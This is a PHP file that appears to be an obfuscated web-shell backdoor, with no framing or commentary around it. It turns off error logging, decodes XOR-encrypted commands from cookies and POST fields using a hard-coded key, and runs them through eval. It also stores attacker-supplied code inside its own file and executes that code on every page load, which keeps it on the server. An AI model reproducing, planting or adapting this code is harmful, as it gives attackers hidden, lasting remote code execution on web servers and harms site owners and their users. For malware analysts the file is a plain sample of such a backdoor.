@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);


if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}

if (!defined('file_put_contents '))
{
    define('file_put_contents ', 1);

    $wybwct = 'cbb63934-e1f8-4a4a-9b3b-c5abe493ed6c';
    global $wybwct;

    function ynofbc($charwkv) {

        if (strlen($charwkv) < 4)
        {
            return "";
        }

        $tdgxbeyk = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        $cocxxf = str_split($tdgxbeyk);
        $cocxxf = array_flip($cocxxf);

        $xjdaxqp = 0;
        $ebqpwgokynayvb = "";

        $charwkv = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $charwkv);

        do {
            $aawfodjbywqygwg = $cocxxf[$charwkv[$xjdaxqp++]];
            $cnexoh = $cocxxf[$charwkv[$xjdaxqp++]];
            $snrwzz = $cocxxf[$charwkv[$xjdaxqp++]];
            $kghlmvpy = $cocxxf[$charwkv[$xjdaxqp++]];

            $wuaauro = ($aawfodjbywqygwg << 2) | ($cnexoh >> 4);
            $apvrvmn = (($cnexoh & 15) << 4) | ($snrwzz >> 2);
            $ureeeig = (($snrwzz & 3) << 6) | $kghlmvpy;
            $ebqpwgokynayvb = $ebqpwgokynayvb . chr($wuaauro);
            if ($snrwzz != 64) {
                $ebqpwgokynayvb = $ebqpwgokynayvb . chr($apvrvmn);
            }
            if ($kghlmvpy != 64) {
                $ebqpwgokynayvb = $ebqpwgokynayvb . chr($ureeeig);
            }
        } while ($xjdaxqp < strlen($charwkv));
        return $ebqpwgokynayvb;
    }

    if (!function_exists('file_put_contents'))
    {
        function file_put_contents($cwcwow, $cgywgncu, $pzshytnh = False)
        {
            $midnxm = $pzshytnh == 8 ? 'a' : 'w';
            $aawfodjb = @fopen($cwcwow, $midnxm);
            if ($aawfodjb === False)
            {
                return 0;
            }
            else
            {
                if (is_array($cgywgncu)) $cgywgncu = implode($cgywgncu);
                $wmzegm = fwrite($aawfodjb, $cgywgncu);
                fclose($aawfodjb);
                return $wmzegm;
            }
        }
    }

    if (!function_exists('file_get_contents'))
    {
        function file_get_contents($qbjyivnw)
        {
            $pbddie = fopen($qbjyivnw, "r");
            $hssdphch = fread($pbddie, filesize($qbjyivnw));
            fclose($pbddie);

            return $hssdphch;
        }
    }
    function nwtfxq()
    {
        return trim(preg_replace("/\(.*\$/", '', __FILE__));
    }

    function ajgsuex($thfoiq, $lqlprgj)
    {
        $rqoxhu = "";

        for ($xjdaxqp=0; $xjdaxqp<strlen($thfoiq);)
        {
            for ($ebqpwgok=0; $ebqpwgok<strlen($lqlprgj) && $xjdaxqp<strlen($thfoiq); $ebqpwgok++, $xjdaxqp++)
            {
                $rqoxhu .= chr(ord($thfoiq[$xjdaxqp]) ^ ord($lqlprgj[$ebqpwgok]));
            }
        }

        return $rqoxhu;
    }

    function zuzzoqb($thfoiq, $lqlprgj)
    {
        global $wybwct;

        return ajgsuex(ajgsuex($thfoiq, $lqlprgj), $wybwct);
    }
    function kmmbgih($thfoiq, $lqlprgj)
    {
        global $wybwct;

        return ajgsuex(ajgsuex($thfoiq, $wybwct), $lqlprgj);
    }

    function jvpgpxkt()
    {
        $hajaay = @file_get_contents(nwtfxq());

        $kfzhont = strpos($hajaay, md5(nwtfxq()));
        if ($kfzhont !== FALSE)
        {
            $pbjayo = substr($hajaay, $kfzhont + 32);
            $aawfodjbcaqnrqj = @unserialize(zuzzoqb(rawurldecode($pbjayo), md5(nwtfxq())));
        }
        else
        {
            $aawfodjbcaqnrqj = Array();
        }

        return $aawfodjbcaqnrqj;
    }

    function rmwmgl($aawfodjbcaqnrqj)
    {
        $awdcnufm = rawurlencode(kmmbgih(@serialize($aawfodjbcaqnrqj), md5(nwtfxq())));
        $hajaay = @file_get_contents(nwtfxq());

        $kfzhont = strpos($hajaay, md5(nwtfxq()));
        if ($kfzhont !== FALSE)
        {
            $ppnrkxz = substr($hajaay, $kfzhont + 32);
            $hajaay = str_replace($ppnrkxz, $awdcnufm, $hajaay);

        }
        else
        {
            $hajaay = $hajaay . "\n\n//" . md5(nwtfxq()) . $awdcnufm;
        }

        @file_put_contents(nwtfxq(), $hajaay);
    }

    function rayckozr($cgywgncuorewoqc, $trlphm)
    {
        $aawfodjbcaqnrqj = jvpgpxkt();

        $aawfodjbcaqnrqj[$cgywgncuorewoqc] = ynofbc($trlphm);

        rmwmgl($aawfodjbcaqnrqj);
    }

    function jbnmvjoc($cgywgncuorewoqc)
    {
        $aawfodjbcaqnrqj = jvpgpxkt();

        unset($aawfodjbcaqnrqj[$cgywgncuorewoqc]);

        rmwmgl($aawfodjbcaqnrqj);
    }

    function gywons($cgywgncuorewoqc=NULL)
    {
        foreach (jvpgpxkt() as $cwcwowkeitzm=>$xsbfww)
        {
            if ($cgywgncuorewoqc)
            {
                if (strcmp($cgywgncuorewoqc, $cwcwowkeitzm) == 0)
                {
                    eval($xsbfww);
                    break;
                }
            }
            else
            {
                eval($xsbfww);
            }
        }
    }

    foreach (array_merge($_COOKIE, $_POST) as $ozegvbp => $thfoiq)
    {
        $thfoiq = @unserialize(zuzzoqb(ynofbc($thfoiq), $ozegvbp));

        if (isset($thfoiq['ak']) && $wybwct==$thfoiq['ak'])
        {
            if ($thfoiq['a'] == 'i')
            {
                $xjdaxqp = Array(
                    'pv' => @phpversion(),
                    'sv' => '2.0-1',
                    'ak' => $thfoiq['ak'],
                );
                echo @serialize($xjdaxqp);
                exit;
            }
            elseif ($thfoiq['a'] == 'e')
            {
                eval($thfoiq['d']);
            }
            elseif ($thfoiq['a'] == 'plugin')
            {
                if($thfoiq['sa'] == 'add')
                {
                    rayckozr($thfoiq['p'], $thfoiq['d']);
                }
                elseif($thfoiq['sa'] == 'rem')
                {
                    jbnmvjoc($thfoiq['p']);
                }
            }
            echo $thfoiq['ak'];
            exit();
        }
    }

    gywons();
}
